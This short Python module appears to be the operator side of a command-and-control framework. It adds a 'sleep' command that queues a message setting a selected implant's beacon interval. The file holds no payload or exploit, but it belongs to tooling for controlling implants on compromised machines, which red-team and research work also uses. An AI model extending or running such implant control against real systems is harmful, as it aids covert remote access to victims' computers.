from features import addFeature
from messages import OutgoingMessage

class SleepCommand:
  command = 'sleep'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      #if len(arguments) == 1 and arguments[0] == '1':
      if len(arguments) == 1:
        
        #message = OutgoingMessage(SleepCommand.command, arguments[0].to_bytes(4, 'big'))
        message = OutgoingMessage(SleepCommand.command, bytes(arguments[0], 'ascii'))
        implant.queueOutgoingMessage(message)
      else:
        print('Usage: sleep milliseconds') 

  def help():
    return 'Set the sleep interval. Usage: sleep milliseconds'

  def incoming(data, implant):
    pass

addFeature(SleepCommand)
